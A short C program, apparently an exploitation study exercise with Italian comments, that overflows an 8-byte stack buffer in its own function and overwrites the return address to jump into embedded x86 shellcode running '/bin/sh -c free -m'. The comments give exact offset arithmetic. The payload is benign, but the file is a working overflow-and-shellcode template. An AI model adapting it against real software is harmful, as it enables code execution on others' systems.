#include <stdio.h>
#include <string.h>
#define SIZE 64
#define shcd "\
\x31\xc0\x6a\x6d\x66\x68\x20\x2d\x68\x66\
\x72\x65\x65\x89\xe2\x50\x66\x68\x2d\x63\
\x89\xe1\x6a\x68\x66\x68\x2f\x73\x68\x2f\
\x62\x69\x6e\x89\xe3\x50\x52\x51\x53\x89\
\xe1\x99\xb0\x0b\xcd\x80"




/*working shellcode calcolato al millimetro: solo la sub %esp giusta e niente nop*/

/*IMPORTANTE PER OGNI DEBUG: la distanza tra shellcode[0] e esp(all'inizio dello shellcode) è 24+SIZE
a questa va tolto il numero di byte pushati mentre si esegue lo shellcode in totale:
24+SIZE-[byte pushati]*/    //SIZE=SHELLCODE_LEN+[byte pushati]-28
//24-40
void bof();
int main(){
	bof();
	return 0;
}
void bof(){
	char boff[8],shellcode[SIZE]=shcd, *p=shellcode;
	strcpy(boff, "aaaaaaaaaaaaaaaaaaaa");
	memmove(boff+20, &p, 4);
}
